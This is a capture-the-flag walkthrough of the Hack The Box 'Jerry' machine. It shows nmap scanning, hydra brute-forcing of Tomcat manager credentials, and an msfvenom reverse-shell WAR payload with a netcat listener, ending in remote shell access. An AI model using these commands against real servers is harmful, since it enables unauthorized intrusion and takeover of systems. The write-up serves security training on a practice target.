# Overview

![Desktop view](/assets/img/sample/HTC/jerry_htb_screen.png)

### Host discovery

We will use Nmap for host discovery.

```shell
nmap -sV -sC 10.10.10.95
```

This machine has port 8080 open and runs “Apache Tomcat/Coyote JSP engine”, an HTTP web server environment for running Java applications.

![Desktop view](/assets/img/sample/HTC/jerry_nmap.png)

![Desktop view](/assets/img/sample/HTC/jerry_server_status.png)

![Desktop view](/assets/img/sample/HTC/jerry_default_password.png)

Open http://http://10.10.10.95:8080/manager/ and log in with the default credentials shown above.

## Brute-forcing Tomcat default credentials with Hydra and SecLists

A second approach is to brute-force the Tomcat login page. Open Burp Suite, copy the request, and then use it with Hydra to find the Tomcat username and password. First, install the wordlist containing Tomcat default credentials.

```terminal
sudo apt install seclists
hydra -C /user/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
```

![Desktop view](/assets/img/sample/HTC/hydra-bruteforce.png)

Log in at http://10.10.10.95:8080/manager with the credentials found above.

![Desktop view](/assets/img/sample/HTC/jerry_login.png)

We have successfully reached the Tomcat dashboard. It allows file uploads, so uploading a payload may be enough to gain access to the server.

![Desktop view](/assets/img/sample/HTC/jerry_upload_war.png)

## Generating payloads

We will use msfvenom to create a payload, upload it, and then set up a Netcat listener.

```terminal
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=1234 -f war > exploit.war
```

Unzip the generated file to find the JSP filename. We will need it in the URL when we run the payload. The target host will then connect back to our Netcat listener.

```terminal
unzip exploit.war
```

![Desktop view](/assets/img/sample/HTC/jerry_jsp.png)

```terminal
nc -nlvp 1234
```

Next, open http://10.10.10.95:8080/exploit/mroilmcirxmx.jsp.

We now have access to the host.
